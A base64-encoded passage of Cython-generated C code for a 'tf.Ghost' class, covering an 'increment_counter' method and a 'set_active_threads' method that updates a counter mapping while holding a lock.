B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgICAgICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfMTApOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgICAgIGlmIChfX3B5eF90XzExIDwgKDApKSBfX1BZWF9FUlIoMCwgNzUsIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcikKICAgICAgICAgIF9fcHl4X3RfMTIgPSAoIV9fcHl4X3RfMTEpOwogICAgICAgICAgaWYgKHVubGlrZWx5KF9fcHl4X3RfMTIpKSB7CiAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8xKTsKICAgICAgICAgICAgX19QeXhfR0lWRVJFRihfX3B5eF90XzMpOwogICAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzQpOwogICAgICAgICAgICBfX1B5eF9FcnJSZXN0b3JlV2l0aFN0YXRlKF9fcHl4X3RfMSwgX19weXhfdF8zLCBfX3B5eF90XzQpOwogICAgICAgICAgICBfX3B5eF90XzEgPSAwOyAgX19weXhfdF8zID0gMDsgIF9fcHl4X3RfNCA9IDA7IAogICAgICAgICAgICBfX1BZWF9FUlIoMCwgNzUsIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcikKICAgICAgICAgIH0KICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgIGdvdG8gX19weXhfTDhfZXhjZXB0aW9uX2hhbmRsZWQ7CiAgICAgICAgfQogICAgICAgIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcjo7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTsKICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpOwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOSk7CiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzgsIF9fcHl4X3RfOSk7CiAgICAgICAgZ290byBfX3B5eF9MMV9lcnJvcjsKICAgICAgICBfX3B5eF9MOF9leGNlcHRpb25faGFuZGxlZDo7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTsKICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzgpOwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOSk7CiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzgsIF9fcHl4X3RfOSk7CiAgICAgICAgX19weXhfTDEyX3RyeV9lbmQ6OwogICAgICB9CiAgICB9CiAgICAgewogICAgICB7CiAgICAgICAgaWYgKF9fcHl4X3RfMikgewogICAgICAgICAgX19weXhfdF85ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzBdLCBOVUxMKTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgNzUsIF9fcHl4X0wxX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKICAgICAgICB9CiAgICAgICAgZ290byBfX3B5eF9MNjsKICAgICAgfQogICAgICBfX3B5eF9MNjo7CiAgICB9CiAgICBnb3RvIF9fcHl4X0wxNjsKICAgIF9fcHl4X0wzX2Vycm9yOjsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogICAgZ290byBfX3B5eF9MMV9lcnJvcjsKICAgIF9fcHl4X0wxNjo7CiAgfQoKICAKCiAgCiAgX19weXhfciA9IFB5X05vbmU7IF9fUHl4X0lOQ1JFRihQeV9Ob25lKTsKICBnb3RvIF9fcHl4X0wwOwogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzMpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC5pbmNyZW1lbnRfY291bnRlciIsIF9fcHl4X2NsaW5lbm8sIF9fcHl4X2xpbmVubywgX19weXhfZmlsZW5hbWUpOwogIF9fcHl4X3IgPSBOVUxMOwogIF9fcHl4X0wwOjsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ydGZfNUdob3N0XzVzZXRfYWN0aXZlX3RocmVhZHMoUHlPYmplY3QgKl9fcHl4X3NlbGYsIAojaWYgQ1lUSE9OX01FVEhfRkFTVENBTEwKUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZWxzZQpQeU9iamVjdCAqX19weXhfYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2VuZGlmCik7IApzdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8ydGZfNUdob3N0XzVzZXRfYWN0aXZlX3RocmVhZHMgPSB7InNldF9hY3RpdmVfdGhyZWFkcyIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMnRmXzVHaG9zdF81c2V0X2FjdGl2ZV90aHJlYWRzLCBfX1B5eF9NRVRIX0ZBU1RDQUxMfE1FVEhfS0VZV09SRFMsIDB9OwpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJ0Zl81R2hvc3RfNXNldF9hY3RpdmVfdGhyZWFkcyhQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKSB7CiAgUHlPYmplY3QgKl9fcHl4X3Zfc2VsZiA9IDA7CiAgUHlPYmplY3QgKl9fcHl4X3ZfY291bnQgPSAwOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7CiAgI2VuZGlmCiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzOwogIFB5T2JqZWN0KiB2YWx1ZXNbMl0gPSB7MCwwfTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJzZXRfYWN0aXZlX3RocmVhZHMgKHdyYXBwZXIpIiwgMCk7CiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTAogICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfU0laRQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9HRVRfU0laRShfX3B5eF9hcmdzKTsKICAjZWxzZQogIF9fcHl4X25hcmdzID0gUHlUdXBsZV9TaXplKF9fcHl4X2FyZ3MpOyBpZiAodW5saWtlbHkoX19weXhfbmFyZ3MgPCAwKSkgcmV0dXJuIE5VTEw7CiAgI2VuZGlmCiAgI2VuZGlmCiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19GQVNUQ0FMTChfX3B5eF9hcmdzLCBfX3B5eF9uYXJncyk7CiAgewogICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2VsZiwmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NvdW50LDB9OwogICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7CiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDc4LCBfX3B5eF9MM19lcnJvcikKICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHsKICAgICAgc3dpdGNoIChfX3B5eF9uYXJncykgewogICAgICAgIGNhc2UgIDI6CiAgICAgICAgdmFsdWVzWzFdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDEpOwogICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzFdKSkgX19QWVhfRVJSKDAsIDc4LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7CiAgICAgICAgY2FzZSAgMToKICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7CiAgICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMF0pKSBfX1BZWF9FUlIoMCwgNzgsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAwOiBicmVhazsKICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgICB9CiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7CiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJzZXRfYWN0aXZlX3RocmVhZHMiLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDc4LCBfX3B5eF9MM19lcnJvcikKICAgICAgZm9yIChQeV9zc2l6ZV90IGkgPSBfX3B5eF9uYXJnczsgaSA8IDI7IGkrKykgewogICAgICAgIGlmICh1bmxpa2VseSghdmFsdWVzW2ldKSkgeyBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgic2V0X2FjdGl2ZV90aHJlYWRzIiwgMSwgMiwgMiwgaSk7IF9fUFlYX0VSUigwLCA3OCwgX19weXhfTDNfZXJyb3IpIH0KICAgICAgfQogICAgfSBlbHNlIGlmICh1bmxpa2VseShfX3B5eF9uYXJncyAhPSAyKSkgewogICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgfSBlbHNlIHsKICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApOwogICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCA3OCwgX19weXhfTDNfZXJyb3IpCiAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTsKICAgICAgaWYgKCFDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmIHVubGlrZWx5KCF2YWx1ZXNbMV0pKSBfX1BZWF9FUlIoMCwgNzgsIF9fcHl4X0wzX2Vycm9yKQogICAgfQogICAgX19weXhfdl9zZWxmID0gdmFsdWVzWzBdOwogICAgX19weXhfdl9jb3VudCA9IHZhbHVlc1sxXTsKICB9CiAgZ290byBfX3B5eF9MNl9za2lwOwogIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjsKICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgic2V0X2FjdGl2ZV90aHJlYWRzIiwgMSwgMiwgMiwgX19weXhfbmFyZ3MpOyBfX1BZWF9FUlIoMCwgNzgsIF9fcHl4X0wzX2Vycm9yKQogIF9fcHl4X0w2X3NraXA6OwogIGdvdG8gX19weXhfTDRfYXJndW1lbnRfdW5wYWNraW5nX2RvbmU7CiAgX19weXhfTDNfZXJyb3I6OwogIGZvciAoUHlfc3NpemVfdCBfX3B5eF90ZW1wPTA7IF9fcHl4X3RlbXAgPCAoUHlfc3NpemVfdCkoc2l6ZW9mKHZhbHVlcykvc2l6ZW9mKHZhbHVlc1swXSkpOyArK19fcHl4X3RlbXApIHsKICAgIFB5X1hERUNSRUYodmFsdWVzW19fcHl4X3RlbXBdKTsKICB9CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC5zZXRfYWN0aXZlX3RocmVhZHMiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gTlVMTDsKICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7CiAgX19weXhfciA9IF9fcHl4X3BmXzJ0Zl81R2hvc3RfNHNldF9hY3RpdmVfdGhyZWFkcyhfX3B5eF9zZWxmLCBfX3B5eF92X3NlbGYsIF9fcHl4X3ZfY291bnQpOwoKICAKICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1wKSB7CiAgICBQeV9YREVDUkVGKHZhbHVlc1tfX3B5eF90ZW1wXSk7CiAgfQogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJ0Zl81R2hvc3RfNHNldF9hY3RpdmVfdGhyZWFkcyhDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9zZWxmLCBQeU9iamVjdCAqX19weXhfdl9jb3VudCkgewogIFB5T2JqZWN0ICpfX3B5eF9yID0gTlVMTDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIFB5T2JqZWN0ICpfX3B5eF90XzEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzIgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzUgPSBOVUxMOwogIHNpemVfdCBfX3B5eF90XzY7CiAgUHlPYmplY3QgKl9fcHl4X3RfNyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfOCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfOSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTAgPSBOVUxMOwogIGludCBfX3B5eF90XzExOwogIGludCBfX3B5eF90XzEyOwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInNldF9hY3RpdmVfdGhyZWFkcyIsIDApOwoKICAKICAgewogICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9sb2NrKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgNzksIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICBfX3B5eF90XzIgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2V4aXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCA3OSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgIF9fcHl4X3RfNCA9IE5VTEw7CiAgICBfX3B5eF90XzUgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2VudGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgNzksIF9fcHl4X0wzX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICBfX3B5eF90XzYgPSAxOwogICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgaWYgKGxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkgewogICAgICBfX3B5eF90XzQgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpOwogICAgICBhc3NlcnQoX19weXhfdF80KTsKICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzUpOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF80KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICBfX3B5eF90XzYgPSAwOwogICAgfQogICAgI2VuZGlmCiAgICB7CiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzQsIE5VTEx9OwogICAgICBfX3B5eF90XzMgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNiwgKDEtX19weXhfdF82KSB8IChfX3B5eF90XzYqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDc5LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgICB9CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwogICAgIHsKICAgICAgewogICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfZGVjbGFyZQogICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICAgICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF83LCAmX19weXhfdF84LCAmX19weXhfdF85KTsKICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpOwogICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF85KTsKICAgICAgICAgewoKICAgICAgICAgIAogICAgICAgICAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3NlbGYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb3VudGVyKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgODAsIF9fcHl4X0w3X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgICAgICAgICBpZiAodW5saWtlbHkoKFB5T2JqZWN0X1NldEl0ZW0oX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWN0aXZlX3RocmVhZHMsIF9fcHl4X3ZfY291bnQpIDwgMCkpKSBfX1BZWF9FUlIoMCwgODAsIF9fcHl4X0w3X2Vycm9yKQogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CgogICAgICAgICAgCiAgICAgICAgfQogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICAgIGdvdG8gX19weXhfTDEyX3RyeV9lbmQ7CiAgICAgICAgX19weXhfTDdfZXJyb3I6OwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgewogICAgICAgICAgX19QeXhfQWRkVHJhY2ViYWNrKCJ0Zi5HaG9zdC5zZXRfYWN0aXZlX3RocmVhZHMiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgICAgIGlmIChfX1B5eF9HZXRFeGNlcHRpb24oJl9fcHl4X3RfMSwgJl9fcHl4X3RfMywgJl9fcHl4X3RfNSkgPCAwKSBfX1BZWF9FUlIoMCwgNzksIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcikKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xKTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8zKTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTsKICAgICAgICAgIF9fcHl4X3RfNCA9IFB5VHVwbGVfUGFjaygzLCBfX3B5eF90XzEsIF9fcHl4X3RfMywgX19weXhfdF81KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgNzksIF9fcHl4X0w5X2V4Y2VwdF9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8yLCBfX3B5eF90XzQsIE5VTEwpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCA3OSwgX19weXhfTDlfZXhjZXB0X2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzEwKTsKICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgICAgICBpZiAoX19weXhfdF8xMSA8ICgwKSkgX19QWVhfRVJSKDAsIDc5LCBfX3B5eF9MOV9leGNlcHRfZXJyb3IpCiAgICAgICAgICBfX3B5eF90XzEyID0gKCFfX3B5eF90XzExKTsKICAgICAgICAgIGlmICh1bmxpa2VseShfX3B5eF90XzEyKSkgewogICAgICAgICAgICBfX1B5eF9HSVZFUkVGKF9fcHl4X3RfMSk7CiAgICAgICAgICAgIF9fUHl4X0dJVkVSRUYoX19weXhfdF8zKTsKICAgICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF81KTsKICAgICAgICAgICAgX19QeXhfRXJyUmVzdG9yZVdpdGhTdGF0ZShfX3B5eF90XzEsIF9fcHl4X3RfMywgX19weXhfdF81KTsKICAgICAgICAgICAgX19weXhfdF8xID0gMDsgIF9fcHl4X3RfMyA9IDA7ICBfX3B5eF90XzUgPSAwOyAKICAgICAgICAgICAgX19QWVhfRVJSKDAsIDc5LCBfX3B5eF9MOV9leGNlcHRfZXJyb3IpCiAgICAgICAgICB9CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICBnb3RvIF9fcHl4X0w4X2V4Y2VwdGlvbl9oYW5kbGVkOwogICAgICAgIH0KICAgICAgICBfX3B5eF9MOV9leGNlcHRfZXJyb3I6OwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzkpOwogICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfNywgX19weXhfdF84LCBfX3B5eF90XzkpOwogICAgICAgIGdvdG8gX19weXhfTDFfZXJyb3I7CiAgICAgICAgX19weXhfTDhfZXhjZXB0aW9uX2hhbmRsZWQ6OwogICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7CiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTsKICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzkpOwogICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfNywgX19weXhfdF84LCBfX3B5eF90XzkpOwogICAgICAgIF9fcHl4X0wxMl90cnlfZW5kOjsKICAgICAgfQogICAgfQogICAgIHsKICAgICAgewogICAgICAgIGlmIChfX3B5eF90XzIpIHsKICAgICAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVswXSwgTlVMTCk7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDc5LCBfX3B5eF9MMV9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgICAgfQogICAgICAgIGdvdG8gX19weXhfTDY7CiAgICAgIH0KICAgICAgX19weXhfTDY6OwogICAgfQogICAgZ290byBfX3B5eF9MMTY7CiAgICBfX3B5eF9MM19lcnJvcjo7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIGdvdG8gX19weXhfTDFfZXJyb3I7CiAgICBfX3B5eF9MMTY6OwogIH0KCiAgCgogIAogIF9fcHl4X3IgPSBQeV9Ob25lOyBfX1B5eF9JTkNSRUYoUHlfTm9uZSk7CiAgZ290byBfX3B5eF9MMDsKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8zKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19